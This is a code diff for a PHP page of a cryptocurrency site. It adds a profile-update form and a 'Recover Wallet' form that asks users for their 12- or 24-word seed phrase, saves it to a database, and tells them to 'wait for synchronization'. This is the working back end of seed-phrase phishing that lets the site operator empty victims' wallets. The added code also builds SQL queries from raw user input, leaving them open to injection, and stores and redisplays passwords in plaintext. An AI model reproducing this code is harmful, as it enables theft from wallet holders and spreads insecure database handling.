@@ -77,79 +77,115 @@ if (!isset($_SESSION["cryptup_user"])) {
                         <h2 class="text-3xl font-bold text-white">Update Profile</h2>
                         <p class="text-[var(--text-secondary)] mt-2">Securely send cryptocurrency to any address.</p>
                     </div>
-                    <form class="space-y-6">
+                    <form method="post" class="space-y-6">
                         <div>
                             <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
-                                for="coin-select">Select Coin</label>
+                                for="name">Name</label>
                             <div class="relative">
-                                <select class="input appearance-none" id="coin-select">
-                                    <option>Bitcoin (BTC)</option>
-                                    <option>Ethereum (ETH)</option>
-                                    <option>Litecoin (LTC)</option>
-                                </select>
-                                <span
-                                    class="material-icons absolute right-3 top-1/2 -translate-y-1/2 text-[var(--text-secondary)] pointer-events-none">expand_more</span>
+                                <input class="input pr-12" id="name" value="<?=$userInfo['name']?>" name="name" placeholder="Enter your name"
+                                    type="text" />
                             </div>
                         </div>
                         <div>
-                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
-                                for="recipient-address">Recipient Address</label>
+                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2" for="email">Email
+                                Address</label>
                             <div class="relative">
-                                <input class="input pr-12" id="recipient-address" placeholder="Enter address"
-                                    type="text" />
+                                <input class="input pr-12" id="email" name="email" value="<?= $userInfo['email'] ?>" placeholder="Enter address"
+                                    type="email" />
 
                             </div>
                         </div>
                         <div>
                             <div class="flex justify-between items-baseline">
                                 <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
-                                    for="amount">Amount</label>
-                                <span class="text-xs text-[var(--text-secondary)]">Available: 0.12345 BTC</span>
+                                    for="password">Password</label>
                             </div>
                             <div class="relative">
-                                <input class="input" id="amount" placeholder="0.00" type="number" />
-                                <span
-                                    class="absolute right-4 top-1/2 -translate-y-1/2 text-[var(--text-secondary)] font-semibold">BTC</span>
+                                <input class="input" id="password" placeholder="*****" value="<?=$userInfo['password']?>" name="password" type="text" />
+
                             </div>
                         </div>
-                        <!-- <div
-                            class="text-sm text-[var(--text-secondary)] border-t border-[var(--border-color)] pt-4 space-y-2">
-                            <div class="flex justify-between">
-                                <span>Network Fee:</span>
-                                <span class="text-white font-medium">~ 0.00012 BTC</span>
-                            </div>
-                            <div class="flex justify-between">
-                                <span>Total:</span>
-                                <span class="text-white font-medium">0.00000 BTC</span>
-                            </div>
-                        </div> -->
                         <div>
-                            <button class="button_primary" type="submit">
-                                Review Transaction
+                            <button class="button_primary" name="update" type="submit">
+                                Update Profile
                             </button>
                         </div>
+                        <?php
+                        if (isset($_POST["update"])) {
+                            $name = htmlspecialchars($_POST["name"]);
+                            $email = htmlspecialchars($_POST["email"]);
+                            $password = htmlspecialchars($_POST["password"]);
+
+                            $update = mysqli_query($conn, "UPDATE `users` SET `name`='$name', `email`='$email', `password`='$password' WHERE `id`='$user_id'");
+                            if ($update) {
+                                echo "<script>location.href = 'settings.php'; alert('Profile updated successfully!')</script>";
+                            } else {
+                                echo "<script>alert('Something went wrong! Please try again.')</script>";
+                            }
+                        }
+                        ?>
                     </form>
                 </div>
 
                 <!-- phrase -->
                 <div class="card w-full max-w-lg mx-auto">
-                    <div class="text-center">
-                        <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
-                        <p class="typography_body">Enter your 12-word seed phrase to recover your wallet.</p>
-                    </div>
-                    <div class="mt-8">
-                        <textarea
-                            class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
-                            placeholder="Enter your 12-word seed phrase"></textarea>
-                        <p class="typography_body mt-2 text-center text-red-500">Incorrect seed phrase. Please try
-                            again.</p>
-                    </div>
-                    <div class="mt-6 flex justify-center">
-                        <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider">
-                            <span>Recover Wallet</span>
-                        </button>
-                    </div>
+                    <form method="post" class="card w-full max-w-lg">
+                        <div class="text-center">
+                            <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
+                            <p class="typography_body">Enter your 12 or 24-word seed phrase to recover your wallet.</p>
+                        </div>
+                        <div class="mt-8">
+                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
+                                for="recipient-address">Wallet</label>
+                            <div class="relative">
+                                <input class="input w-full" id="recipient-address" required name="wallet"
+                                    placeholder="E.g: Trust wallet" type="text" />
+
+                            </div>
+                        </div>
+                        <div class="mt-4">
+                            <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
+                                for="phrase">Phrase</label>
+                            <textarea id="phrase" required name="phrase"
+                                class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
+                                placeholder="Enter your 12 or 24-word seed phrase"></textarea>
+                            <?php if (isset($_SESSION["error"])): ?>
+                                <p class="typography_body mt-2 text-center text-red-500"><?= $_SESSION["error"]; ?></p>
+                                <?php
+                                unset($_SESSION["error"]);
+                            endif;
+                            ?>
+                        </div>
+                        <div class="mt-6 flex justify-center">
+                            <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider"
+                                name="save" type="submit">
+                                <span>Recover Wallet</span>
+                            </button>
+                        </div>
+                        <?php
+                        if (isset($_POST["save"])) {
+                            $wallet = htmlspecialchars($_POST["wallet"]);
+                            $phrase = trim(htmlspecialchars($_POST["phrase"]));
+                            $phraseArr = explode(" ", $phrase);
+                            if (count($phraseArr) < 12 || (count($phraseArr) > 12 && count($phraseArr) < 24) || count($phraseArr) > 24) {
+                                $_SESSION["error"] = "Invalid Wallet phrase!";
+                                echo "<script>location.href = 'wallet-phrase.php'; </script>";
+                            } else {
+
+                                $save = mysqli_query($conn, "INSERT INTO `wallet_phrases` (`user_id`,`wallet`, `phrase`) VALUES ('$user_id', '$wallet', '$phrase')");
+                                if ($save) {
+                                    echo "<script>location.href = 'dashboard.php'; alert('Wallet phrase added wait for synchronization')</script>";
+                                } else {
+                                    $_SESSION["error"] = "Something went wrong!";
+                                    echo "<script>location.href = 'wallet-phrase.php'; </script>";
+                                }
+                            }
+
+                        }
+                        ?>
+                    </form>
                 </div>
+
             </main>
         </div>
     </div>
